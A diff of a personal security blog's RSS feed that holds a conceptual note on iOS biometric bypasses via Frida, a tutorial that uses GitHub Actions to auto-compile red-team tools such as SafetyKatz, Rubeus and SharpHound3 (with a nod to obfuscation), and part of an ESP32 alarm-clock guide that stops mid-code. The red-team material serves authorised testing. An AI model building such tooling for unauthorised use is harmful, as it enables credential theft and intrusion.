@@ -1,153 +1,644 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
+    
     <title>potat0ast</title>
-    <link>https://potat0ast.com/index.html</link>
-    <description>Recent content on potat0ast</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language><atom:link href="https://potat0ast.com/index.xml" rel="self" type="application/rss+xml" />
+    <description></description>
+    <link>https://potat0ast.com/</link>
+    
+    <language>en</language>
+    <copyright>Copyright 2023, Ronalds Vilcins</copyright>
+    <lastBuildDate>Tue, 28 Nov 2023 21:33:56 -0800</lastBuildDate>
+    <generator>Hugo - gohugo.io</generator>
+    <docs>http://cyber.harvard.edu/rss/rss.html</docs>
+    <atom:link href="https://ronaldsvilcins.com/atom.xml" rel="self" type="application/atom+xml"/>
+    
     <item>
-      <title>Tags</title>
-      <link>https://potat0ast.com/tags/</link>
+      <title>Bit: iOS Biometrics Bypasses</title>
+      <link>https://potat0ast.com/2023/11/28/bit_on_ios_biometrics_bypasses/</link>
+      <description>&lt;h2 id=&#34;introduction&#34;&gt;Introduction &lt;a href=&#34;#introduction&#34; class=&#34;hash&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;So I was looking at biometric bypasses on iOS and found myself not understanding why certain applications/app logic could be bypassed with a simple Frida script while others were nothing but trouble.&lt;/p&gt;
+&lt;h2 id=&#34;setup&#34;&gt;Setup &lt;a href=&#34;#setup&#34; class=&#34;hash&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;&#34;&gt;&lt;/a&gt;
+&lt;div class=&#34;box&#34;&gt;
+  &lt;iframe src=&#34;&#34;&gt;
+  &lt;/iframe&gt;
+&lt;/div&gt;
+
+I did some reading. &lt;a href=&#34;https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass&#34;&gt;test&lt;/a&gt;
+&lt;div class=&#34;box&#34;&gt;
+  &lt;iframe src=&#34;https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass&#34;&gt;
+  &lt;/iframe&gt;
+&lt;/div&gt;
+ was super helpful, combined with some Googling and Bard/ChatGPT to help me figure out very basic Obj-C syntax.&lt;/p&gt;
+&lt;p&gt;Long story short, one function (the safer one) reaches out to an iOS API that handles keychain items and requests auth from the user. Once authenticated, a key is released to decrypt a particular keychain item (So all of those checks are handled outside the app and the app can do what it needs with the now decrypted keychain item).&lt;/p&gt;
+&lt;p&gt;The other function requests user auth, and based on whether the success boolean is true or false, application logic will execute. Since all of those callback blocks and the logic handling is in the app&amp;rsquo;s context, it can be hooked and modified by Frida. &lt;/p&gt;
+&lt;p&gt;I think. Tell me if I got something wildly wrong xD @M3nn1s for now.&lt;/p&gt;
+&lt;p&gt;also. Test image
+&lt;img src=&#34;https://potat0ast.com/posts/Bit_On_iOS_Biometrics_Bypasses/Test123.png&#34; alt=&#34;Test123.png&#34; loading=&#34;lazy&#34; /&gt;
+&lt;/p&gt;
+</description>
+      <author>ronalds.vilcins@gmail.com (Ronalds Vilcins)</author>
+      <guid>https://potat0ast.com/2023/11/28/bit_on_ios_biometrics_bypasses/</guid>
+      <pubDate>Tue, 28 Nov 2023 21:33:56 -0800</pubDate>
+    </item>
+    
+    <item>
+      <title>Github Actions for Red Team Tools</title>
+      <link>https://potat0ast.com/2021/12/01/github_actions_for_red_team_tools/</link>
+      <description>&lt;p&gt;The usual way to generate red team tools (many C# post-exploit tools) would involve downloading the individual tool from Github, then compiling. On Windows, this was especially tough for me because sometimes the Visual Studio environment would break or it simply involved the extra step of starting a VM. Then there were issues with outdated Git repos and outdated binaries.&lt;/p&gt;
+&lt;p&gt;To get around this and to have Github Actions take care of pretty much all the compiling, I setup an repository that would take care of it. I made heavy reference to and tried to follow &lt;a href=&#34;https://medium.com/@two06/building-tooling-with-github-actions-59401648e61d&#34;&gt;this&lt;/a&gt; but made a couple changes since a few things have changed since the article was written.&lt;/p&gt;
+&lt;p&gt;To get started with your own CI/CD environment, start by creating a Github repository that will hold the repositories that you want to have compiled. I am going to be using SharpHound3 and some repos from GhostPack.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://potat0ast.com/posts/Github_Actions_for_Red_Team_Tools/create-repo.png&#34; alt=&#34;create-repo.png&#34; loading=&#34;lazy&#34; /&gt;
+
+With that done, clone the repo to your local machine to begin adding subrepos to it.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git clone git@github.com:Menn1s/tool-builder.git
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd tool-builder
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From here, you can start pulling in an repos that you want (just make sure you know the process to compile it because later steps may vary if it&amp;rsquo;s not one of the repos shown here).&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git submodule add https://github.com/GhostPack/SafetyKatz.git
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git submodule add https://github.com/GhostPack/SharpUp.git
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git submodule add https://github.com/GhostPack/SharpDPAPI.git
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git submodule add https://github.com/GhostPack/Rubeus.git
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git submodule add https://github.com/GhostPack/Seatbelt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git submodule add https://github.com/BloodHoundAD/SharpHound3.git
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once everything has been cloned into the current repository, create your first commit.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git add -A
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git commit -m &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;first commit&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git push
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Going back to the web UI, click on the Actions tab for your new repository. In short, Github Actions provides us with a way to run workflows remotely using Github&amp;rsquo;s hosted resources. The YAML file used to configure the action will specify the environment and set it up so that it can compile the code we want. If you&amp;rsquo;ve ever worked with Dockerfiles before, this should be familiar.
+&lt;img src=&#34;https://potat0ast.com/posts/Github_Actions_for_Red_Team_Tools/actions-tab.png&#34; alt=&#34;actions-tab.png&#34; loading=&#34;lazy&#34; /&gt;
+
+From here, select the Simple workflow and we will fill out the contents with some YAML. It is quite a bit of text, so I will provide a link to the file &lt;a href=&#34;https://raw.githubusercontent.com/Menn1s/tool-builder/master/.github/workflows/builder.yml&#34;&gt;here&lt;/a&gt; and just break down the important parts below. If you want things to just work (assuming nothing has changed with nuget or any of the other moving parts), just copy and paste the YAML, name the file, and commit the change.&lt;/p&gt;
+&lt;p&gt;The top of the YAML document indicates when the action will be run. In our case, we want it to run each time a change is pushed.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-YAML&#34; data-lang=&#34;YAML&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;on&lt;/span&gt;: [&lt;span style=&#34;color:#ae81ff&#34;&gt;push]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then we specify that we want this to run in a Windows environment:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;runs-on&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;windows-latest&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Under  &lt;code&gt;steps:&lt;/code&gt;, we specify the steps needed to complete the action. We need to use &lt;code&gt;actions/checkout@v2&lt;/code&gt; to be able to pull repositories to a location that the workflow can interact with those repositories. The next step is pretty succinctly explained by its name: Checkout submodules. This is the step that gets the code we want to compile into binaries.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      - &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Checkout submodules&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;shell&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;bash&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;run&lt;/span&gt;: |&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;          # If your submodules are configured to use SSH instead of HTTPS please uncomment the following line
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;          # git config --global url.&amp;#34;https://github.com/&amp;#34;.insteadOf &amp;#34;git@github.com:&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;          auth_header=&amp;#34;$(git config --local --get http.https://github.com/.extraheader)&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;          git submodule sync --recursive
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;          git -c &amp;#34;http.extraheader=$auth_header&amp;#34; -c protocol.version=2 submodule update --init --force --recursive --depth=1&lt;/span&gt;          
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;These next two steps get the setup-nuget action, then use it to install v1.0.5 of Nuget. Nuget is a package manager and we can use it to grab the packages on which a project depends. We can see &lt;code&gt;nuget restore&lt;/code&gt; is used to read the project file to see what the packages are and then install them in our build environment.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;\- name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Setup NuGet.exe for use with actions&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;uses&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;NuGet/setup-nuget@v1.0.5&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;\- name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Nuget Restore SharpHound3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;run&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;nuget restore $Env:GITHUB_WORKSPACE\\SharpHound3\\SharpHound3.sln&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finally, we have the msbuild command that will actually compile the project into a binary we can use.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      - &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Build SharpHound3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;run&lt;/span&gt;: |&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;          cd &amp;#34;C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Enterprise\\MSBuild\\Current\\Bin\\&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;          .\\MSBuild.exe $Env:GITHUB_WORKSPACE\\SharpHound3\\SharpHound3\\SharpHound3.csproj /property:Configuration=Release&lt;/span&gt;          
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Because this binary is in the containerized workflow environment, we also need an action to upload the binary to the repository where we can download it later.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      - &lt;span style=&#34;color:#f92672&#34;&gt;uses&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;actions/upload-artifact@master&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;with&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;SharpHound3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;path&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;SharpHound3\\SharpHound3\\bin\\Release\\SharpHound.exe&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;These steps repeat for each project repository we have. I used a bit of copy and pasting and vim to make the task a bit less repetitive.&lt;/p&gt;
+&lt;p&gt;Once you have commited the YAML file to describe the workflow, the workflow should actually be triggered. Navigate to the Actions tab for your project.
+&lt;img src=&#34;https://potat0ast.com/posts/Github_Actions_for_Red_Team_Tools/actionTabAfterPush.png&#34; alt=&#34;actionTabAfterPush.png&#34; loading=&#34;lazy&#34; /&gt;
+&lt;/p&gt;
+&lt;p&gt;Click on the workflow to see its output.
+&lt;img src=&#34;https://potat0ast.com/posts/Github_Actions_for_Red_Team_Tools/workflowOut.png&#34; alt=&#34;workflowOut.png&#34; loading=&#34;lazy&#34; /&gt;
+
+You should be able to see all the binaries you wanted to compile! And that&amp;rsquo;s all there is to it. The post I referenced above also mentions adding some basic obfuscation to the process. Since we have compilation automated, why not go the extra step. The possibilities seem endless, and I definitely want to explore the Github workflows more. Stay toasty!&lt;/p&gt;
+</description>
+      <author>ronalds.vilcins@gmail.com (Ronalds Vilcins)</author>
+      <guid>https://potat0ast.com/2021/12/01/github_actions_for_red_team_tools/</guid>
+      <pubDate>Wed, 01 Dec 2021 10:08:56 -0800</pubDate>
+    </item>
+    
+    <item>
+      <title>Github Actions for Red Team Tools</title>
+      <link>https://potat0ast.com/2021/12/01/github_actions_for_red_team_tools/</link>
+      <description>&lt;p&gt;&lt;img src=&#34;ferox.png&#34; alt=&#34;ferox.png&#34; loading=&#34;lazy&#34; /&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://google.com&#34;&gt;text&lt;/a&gt;&lt;/p&gt;
+</description>
+      <author>ronalds.vilcins@gmail.com (Ronalds Vilcins)</author>
+      <guid>https://potat0ast.com/2021/12/01/github_actions_for_red_team_tools/</guid>
+      <pubDate>Wed, 01 Dec 2021 10:08:56 -0800</pubDate>
+    </item>
+    
+    <item>
+      <title>T-Beam Alarm Clock (with NTP!)</title>
+      <link>https://potat0ast.com/2021/05/24/t-beam-alarm-clock/</link>
+      <description>&lt;h2 id=&#34;introduction&#34;&gt;Introduction &lt;a href=&#34;#introduction&#34; class=&#34;hash&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;SKIP if you just want the &lt;em&gt;How to&lt;/em&gt;.
+Microcontrollers can be fairly difficult to get into. For the most part, if I had any project, I would head straight for github and grab either some code to push through the Arduino IDE or something that could be flashed (with some more magical GUI software).
+Then, my friend shared with me a project called (Meshtastic)[https://meshtastic.org/] where, using a combination of LORA 915Mhz communication and GPS, you could have an open source device that would let you keep in touch with your party in the great outdoors (without wifi, LTE, or any other more stationary networking resource). I was amazed by what it could do, and I saw that there was just more software to be flashed. So I put in an order for two TTGO T-Beams and waited for them to come in from overseas.
+Finally they arrived&amp;hellip; but I ordered the wrong ones with no OLED screens. I could probably work with them without the screens, but I was there for an easy ride. So I ordered another 2 (at this point I&amp;rsquo;m pushing a hundred bucks for some side project I don&amp;rsquo;t know will even work).
+Those show up, I flash them and&amp;hellip;.. GPS does not connect. Needless to say, I did a bit of Googling but couldn&amp;rsquo;t find much, so they started to sit there.
+Anyway, I needed an alarm because I didn&amp;rsquo;t want an excuse to keep my phone near my bed (since it is the current alarm in use). That thing is an adult pacifier and probably the most appealing thing next to staring at the ceiling. So instead of buying
+&lt;img src=&#34;https://potat0ast.com/posts/T-Beam_Alarm_Clock/19319ca1ecebdab7b1d394774de2f5dc.png&#34; alt=&#34;19319ca1ecebdab7b1d394774de2f5dc.png&#34; loading=&#34;lazy&#34; /&gt;
+&lt;/p&gt;
+&lt;p&gt;I opted to at least make some use of the hundred dollars spent (wasted).&lt;/p&gt;
+&lt;h2 id=&#34;setup&#34;&gt;Setup &lt;a href=&#34;#setup&#34; class=&#34;hash&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;So here are some prerequisites we will need before starting:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Drivers
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.silabs.com/developers/usb-to-uart-bridge-vcp-drivers&#34;&gt;https://www.silabs.com/developers/usb-to-uart-bridge-vcp-drivers&lt;/a&gt; for Windows and Mac. From Silabs. Guess we just have to trust it and click next on the install prompts very quickly so the viruses can&amp;rsquo;t multiply.&lt;/li&gt;
+&lt;li&gt;If you&amp;rsquo;re running Linux, I imagine you already know what to do&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Arduino IDE &lt;a href=&#34;https://www.arduino.cc/en/software&#34;&gt;https://www.arduino.cc/en/software&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;VS Code (not required but it&amp;rsquo;s nice to have)&lt;/li&gt;
+&lt;li&gt;Arduino Libraries
+&lt;ul&gt;
+&lt;li&gt;ESP8266 and ESP32 OLED driver for SSD1306 displays (yeah it&amp;rsquo;s a mouthful). This gets the little screen to work.&lt;/li&gt;
+&lt;li&gt;WiFi for the esp32 should be built in&lt;/li&gt;
+&lt;li&gt;NTPClient (so time isn&amp;rsquo;t completely off)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;First download the driver and install it so your usb port can communicate with the UART channels on your board.
+&lt;img src=&#34;https://potat0ast.com/posts/T-Beam_Alarm_Clock/Screenshot_of_Install_CP210x_VCP_Driver.png&#34; alt=&#34;Screenshot_of_Install_CP210x_VCP_Driver.png&#34; loading=&#34;lazy&#34; /&gt;
+
+Unzip the downloaded file, double click on the dmg, double click on the driver installation app, and follow the on-screen prompts to install it.&lt;/p&gt;
+&lt;p&gt;Once that is installed, also install the Arduino IDE if you haven&amp;rsquo;t already. Then open it up and you should be greeted with something like this
+&lt;img src=&#34;https://potat0ast.com/posts/T-Beam_Alarm_Clock/adc139963d398d86b12ac76d9fe7f7c8.png&#34; alt=&#34;adc139963d398d86b12ac76d9fe7f7c8.png&#34; loading=&#34;lazy&#34; /&gt;
+
+If you&amp;rsquo;ve never used an Arduino board before, this is just some template code for the board. Anything in the {} after setup() will be run only once. Anything in between the {} after loop() will be run repeatedly&amp;hellip; like in a loop.&lt;/p&gt;
+&lt;p&gt;In order to get the code onto the T-beam board, we will need to add the particular board type into our Arduino installation. To do this, first head to the preferences or settings for the IDE and look for the field called &amp;ldquo;Additional Boards Manager URLs&amp;rdquo;.
+Add the following URL: &lt;a href=&#34;https://dl.espressif.com/dl/package_esp32_index.json&#34;&gt;https://dl.espressif.com/dl/package_esp32_index.json&lt;/a&gt; and open the Boards Manager.&lt;/p&gt;
+&lt;p&gt;Search for the esp32 (by Espressif Systems) and install it.
+Go back to Tools -&amp;gt; Board -&amp;gt; ESP32 and select the T-Beam.
+Now, we have essentially configured everything we need to begin communicating with the T-Beam. You can plug in your T-Beam and begin coding and flashing code to your board. However, for more advanced functionality, it is likely that you would install libraries so you don&amp;rsquo;t need to learn how to write code to communicate with a specific OLED screen or how to communicate with a networking chip.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://potat0ast.com/posts/T-Beam_Alarm_Clock/Screenshot_of_Arduino.png&#34; alt=&#34;Screenshot_of_Arduino.png&#34; loading=&#34;lazy&#34; /&gt;
+
+Under the Sketch tab, go to &amp;ldquo;Include Library&amp;rdquo; and select &amp;ldquo;Manage Libraries&amp;hellip;&amp;rdquo;
+The first library we will install is Timelib so that managing time is easier.
+&lt;img src=&#34;https://potat0ast.com/posts/T-Beam_Alarm_Clock/3a9daaf1dbea6e8f5d5be8410e41aab8.png&#34; alt=&#34;3a9daaf1dbea6e8f5d5be8410e41aab8.png&#34; loading=&#34;lazy&#34; /&gt;
+
+Go to the search bar and search &amp;ldquo;time&amp;rdquo; or &amp;ldquo;timelib&amp;rdquo; until you find the library shown above. The install button will be in the bottom right if you haven&amp;rsquo;t already installed the library. Proceed to install all of the following libraries as well:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;esp8266 and esp32 OLED driver for ssd1306 displays: It&amp;rsquo;s a pretty self explanatory library name, but it basically makes it easier to use the small displays that are used on arduino boards. For example, you can print text to the screen or draw shapes to the screen.&lt;/li&gt;
+&lt;li&gt;NTPClient: Contains the code that allows the board to communicate using the network time protocol and get accurate, current time/date.&lt;/li&gt;
+&lt;li&gt;WiFi: Contains code to communicate with common WiFi protocols. Should be installed by default.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;That is all for the libraries we&amp;rsquo;ll be needing. Now here is the code. I will try to comment everything as clearly as possible. Otherwise it should just work once you change the wifi details to suit your access point.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;#34;SSD1306Wire.h&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;WiFi.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;NTPClient.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;TimeLib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;#34;pitches.h&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// see pitches.h file below. It is another file in the same project
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// set wifi variables
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ssid     &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SSID&amp;#34;&lt;/span&gt;;
